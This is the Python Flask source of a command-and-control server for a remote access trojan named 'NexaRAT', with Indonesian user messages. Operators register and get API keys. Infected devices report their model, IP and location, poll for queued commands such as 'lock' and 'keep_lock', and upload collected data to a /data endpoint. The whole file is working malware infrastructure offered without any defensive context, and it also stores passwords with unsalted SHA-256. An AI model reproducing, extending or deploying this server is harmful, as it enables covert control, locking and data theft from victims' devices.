from flask import Flask, request, jsonify
import uuid, hashlib, json, os
from datetime import datetime

app = Flask(__name__)

DB_FILE = 'db.json'

def load_db():
    if not os.path.exists(DB_FILE):
        return {'users': {}, 'logs': {}, 'commands': {}, 'data': {}}
    with open(DB_FILE) as f:
        return json.load(f)

def save_db(db):
    with open(DB_FILE, 'w') as f:
        json.dump(db, f)

def hash_pw(pw):
    return hashlib.sha256(pw.encode()).hexdigest()

def get_user_by_api(api_key, db):
    for username, user in db['users'].items():
        if user['api_key'] == api_key:
            return username, user
    return None, None

@app.route('/')
def index():
    return jsonify({'status': 'NexaRAT Server Online'})

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    db = load_db()
    if data['username'] in db['users']:
        return jsonify({'status': 'error', 'msg': 'Username sudah ada'})
    api_key = str(uuid.uuid4()).replace('-', '')
    db['users'][data['username']] = {
        'password': hash_pw(data['password']),
        'api_key': api_key,
        'devices': {}
    }
    db['logs'][data['username']] = []
    save_db(db)
    return jsonify({'status': 'ok', 'msg': 'Berhasil daftar'})

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    db = load_db()
    user = db['users'].get(data['username'])
    if not user or user['password'] != hash_pw(data['password']):
        return jsonify({'status': 'error', 'msg': 'Username/password salah'})
    return jsonify({'status': 'ok', 'api_key': user['api_key']})

@app.route('/register_device', methods=['POST'])
def register_device():
    data = request.json
    api_key = data.get('api_key')
    db = load_db()
    username, user = get_user_by_api(api_key, db)
    if not user:
        return jsonify({'status': 'error'})
    device_id = data.get('device_id')
    db['users'][username]['devices'][device_id] = {
        'name': data.get('name', 'Unknown'),
        'model': data.get('model', 'Unknown'),
        'ip': request.remote_addr,
        'location': data.get('location', 'Unknown'),
        'status': 'online',
        'last_seen': datetime.now().strftime('%H:%M %d/%m/%Y')
    }
    db.setdefault('commands', {}).setdefault(device_id, [])
    db.setdefault('lock_status', {})[device_id] = False
    save_db(db)
    return jsonify({'status': 'ok'})

@app.route('/devices', methods=['GET'])
def get_devices():
    api_key = request.headers.get('X-API-Key')
    db = load_db()
    username, user = get_user_by_api(api_key, db)
    if not user:
        return jsonify({'status': 'error', 'msg': 'API key tidak valid'})
    return jsonify({'status': 'ok', 'devices': user['devices']})

@app.route('/logs', methods=['GET'])
def get_logs():
    api_key = request.headers.get('X-API-Key')
    db = load_db()
    username, user = get_user_by_api(api_key, db)
    if not user:
        return jsonify({'status': 'error'})
    return jsonify({'status': 'ok', 'logs': db['logs'].get(username, [])})

@app.route('/command', methods=['POST'])
def send_command():
    api_key = request.headers.get('X-API-Key')
    data = request.json
    db = load_db()
    username, user = get_user_by_api(api_key, db)
    if not user:
        return jsonify({'status': 'error'})
    device_id = data['device_id']
    cmd = data.get('command')
    db.setdefault('commands', {}).setdefault(device_id, []).append(data)
    if cmd == 'lock':
        db.setdefault('lock_status', {})[device_id] = True
    elif cmd == 'unlock':
        db.setdefault('lock_status', {})[device_id] = False
    log = {
        'time': datetime.now().strftime('%H:%M %d/%m/%Y'),
        'device': device_id,
        'command': cmd,
        'type': 'command'
    }
    db['logs'][username].append(log)
    save_db(db)
    return jsonify({'status': 'ok'})

@app.route('/poll', methods=['GET'])
def poll():
    device_id = request.args.get('device_id')
    api_key = request.args.get('api_key')
    db = load_db()
    username, user = get_user_by_api(api_key, db)
    if not user:
        return jsonify({})
    # Update last seen
    if device_id in db['users'][username]['devices']:
        db['users'][username]['devices'][device_id]['status'] = 'online'
        db['users'][username]['devices'][device_id]['last_seen'] = datetime.now().strftime('%H:%M %d/%m/%Y')
    # Cek lock status
    lock_status = db.get('lock_status', {}).get(device_id, False)
    commands = db.get('commands', {}).get(device_id, [])
    if commands:
        cmd = commands.pop(0)
        db['commands'][device_id] = commands
        save_db(db)
        return jsonify(cmd)
    save_db(db)
    # Kalau masih locked, kirim lock lagi
    if lock_status:
        return jsonify({'command': 'keep_lock'})
    return jsonify({})

@app.route('/data', methods=['POST'])
def receive_data():
    data = request.json
    api_key = data.get('api_key')
    db = load_db()
    username, user = get_user_by_api(api_key, db)
    if not user:
        return jsonify({'status': 'error'})
    log = {
        'time': datetime.now().strftime('%H:%M %d/%m/%Y'),
        'type': data.get('type'),
        'device': data.get('device_id'),
        'data': data.get('data')
    }
    db['logs'][username].append(log)
    save_db(db)
    return jsonify({'status': 'ok'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
